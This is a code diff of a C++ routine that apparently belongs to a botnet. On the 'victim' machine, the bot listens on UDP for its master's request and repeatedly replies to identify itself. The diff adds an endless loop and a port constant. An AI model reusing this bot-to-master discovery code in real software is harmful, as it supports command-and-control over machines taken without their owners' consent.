@@ -26,7 +26,7 @@ uint32_t findMastersIP()
 
     /* setting the socket on the victims private ip i.e "10.0.0.8" and on port*/
     recvAddr.sin_addr.s_addr = getPrivateIP();
-    recvAddr.sin_port = htons(32568);
+    recvAddr.sin_port = htons(UDP_PORT);
     recvAddr.sin_family = AF_INET;
 
     opt = 1;
@@ -42,21 +42,23 @@ uint32_t findMastersIP()
     message = "What is your IP?";
     response = "My IP";
 
-    /*wait for the master to ask me to connect*/
-    do {
-        ZeroMemory(buf, 65536);
-        fromlen = sizeof(recvAddr);
-        if(recvfrom(s, buf, 65536, 0, (sockaddr*)&recvAddr, &fromlen) < 0)
-        {
-            std::cout << "Recieve error <" << WSAGetLastError() << ">" << std::endl;
-            goto errorLable;
-        }
-    } while (!(std::string(buf) == std::to_string(protocol::REQ)));
+    while (1)
+    {
+        /*wait for the master to ask me to connect*/
+        do {
+            ZeroMemory(buf, 65536);
+            fromlen = sizeof(recvAddr);
+            if (recvfrom(s, buf, 65536, 0, (sockaddr*)&recvAddr, &fromlen) < 0)
+            {
+                std::cout << "Recieve error <" << WSAGetLastError() << ">" << std::endl;
+                goto errorLable;
+            }
+        } while (!(std::string(buf) == std::to_string(protocol::REQ)));
 
-    /* send reply that it's the bot*/
-    if(sendto(s, std::to_string(protocol::RPY).c_str(), response.size(), 0, (sockaddr*)&recvAddr, sizeof(recvAddr)) < 0)
-        std::cout << "Send error <" << WSAGetLastError() << ">" << std::endl;
-
+        /* send reply that it's the bot*/
+        if (sendto(s, std::to_string(protocol::RPY).c_str(), response.size(), 0, (sockaddr*)&recvAddr, sizeof(recvAddr)) < 0)
+            break;
+    }
 
 errorLable:
     delete[] buf;
